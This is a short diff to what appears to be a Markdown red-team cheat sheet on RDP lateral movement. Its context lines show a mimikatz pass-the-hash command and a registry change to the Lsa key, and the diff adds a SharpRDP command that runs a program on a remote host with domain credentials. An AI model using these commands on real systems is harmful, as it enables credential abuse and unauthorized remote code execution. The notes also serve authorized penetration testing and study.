@@ -32,6 +32,18 @@ New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name Disabl
 sekurlsa::pth /user:admin /domain:domain /ntlm:<NTLM HASH> /run:"mstsc.exe /restrictedadmin"
 ```
 
+## SharpRDP
+
+#### RDP in console
+
+```csharp
+SharpRDP.exe computername=target command=notepad username=domain\user password=password!
+
+
+```
+
+
+
 ## Linux RDP
 
 ### xfreerdp
